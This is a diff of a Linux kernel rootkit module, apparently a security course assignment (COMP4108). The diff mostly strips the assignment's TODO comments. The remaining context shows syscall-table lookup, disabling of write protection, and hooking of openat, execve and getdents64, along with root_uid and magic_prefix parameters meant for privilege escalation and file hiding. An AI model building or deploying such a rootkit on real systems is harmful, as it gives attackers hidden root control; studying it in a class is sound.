@@ -1,7 +1,3 @@
-/*
- * COMP4108 Rootkit Framework
-*/
-
 #include <linux/sched.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
@@ -18,7 +14,7 @@
 #endif
 #define MODULE_NAME "rootkit"
 
-// The linux dirent structure for Part C
+// The linux dirent structure 
 struct linux_dirent {
         unsigned long   d_ino;
         unsigned long   d_off;
@@ -36,7 +32,6 @@ typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 static t_syscall original_openat; // create a variable to store the original openat function
 
 /*
- * TODO: NEEDED FOR PART B AND C
  *  create a variable as above to store the original execve and getdents functions
 */
 
@@ -51,7 +46,7 @@ module_param(suffix, charp, 0);
 MODULE_PARM_DESC(suffix, "Received suffix parameter");
 
 //******
-//TODO: NEEDED FOR PART B
+
 //	Accept root_uid as a kernel module parameter 
 //	(see module_parm() example above)
 //******
@@ -66,7 +61,7 @@ MODULE_PARM_DESC(root_uid,"Received root_uid perameter");
 
 
 //******
-//TODO: NEEDED FOR PART C
+
 //	Accept magic_prefix as a kernel module parameter
 //	(see module_parm() example above)
 //******
@@ -80,7 +75,7 @@ MODULE_PARM_DESC(magic_prefix,"Received magic perameter");
 
 
 /* 
- * TODO: NEEDED FOR PART A
+
  *  Update the string provided to the kallsyms_lookup_name function
  * 
  * Locates the address of the system call table using kallsyms_lookup_name
@@ -258,8 +253,7 @@ static int __init init_rootkit(void)
   cr0 = read_cr0();
 
   /*
-   * TODO: NEEDED FOR PART A, B, AND C
-   *  Uncomment the following lines as needed to store the original functions
+ 
    *  before they are hooked. You will need to add lines for the execve and
    *  getdents functions.
   */
@@ -269,13 +263,12 @@ static int __init init_rootkit(void)
 	original_execve = (t_syscall)__sys_call_table[__NR_execve];
 	original_getdents = (t_syscall)__sys_call_table[__NR_getdents64];
   /*
-   * TODO: NEEDED FOR PART A
    *  Unprotect the memory by calling the appropriate function
   */
   unprotect_memory();
   
   /*
-   * TODO: NEEDED FOR PART A
+
    *  Uncomment after completing the unprotect and protect TODO's
   */
 
@@ -283,7 +276,7 @@ static int __init init_rootkit(void)
    __sys_call_table[__NR_openat] = (unsigned long) new_openat;
 
   /*
-   * TODO: NEEDED FOR PARTS B AND C
+
    *  Hook your new execve and getdents functions after writing them
   */
 
@@ -294,7 +287,7 @@ static int __init init_rootkit(void)
   
 
   /*
-   * TODO: NEEDED FOR PART A
+
    *  Protect the memory by calling the appropriate function
   */
   protect_memory();
@@ -307,19 +300,18 @@ static void __exit cleanup_rootkit(void){
   printk(KERN_INFO "Rootkit module is unloaded!\n");
 
   /*
-   * TODO: NEEDED FOR PART A
+   
    *  Unprotect the memory by calling the appropriate function
   */
   unprotect_memory();
   /*
-   * TODO: NEEDED FOR PART A
+
    *  Uncomment after completing the unprotect and protect TODO's
   */
   // Let's unhook and restore the original openat() function
   __sys_call_table[__NR_openat] = (unsigned long)original_openat;
 
   /*
-   * TODO: NEEDED FOR PARTS B AND C
    *  Unhook and restore the execve and getdents functions
   */
 
@@ -329,7 +321,7 @@ __sys_call_table[__NR_execve] = (unsigned long)original_execve;
   __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
 
   /*
-   * TODO: NEEDED FOR PART A
+ 
    *  Protect the memory by calling the appropriate function
   */
   protect_memory();
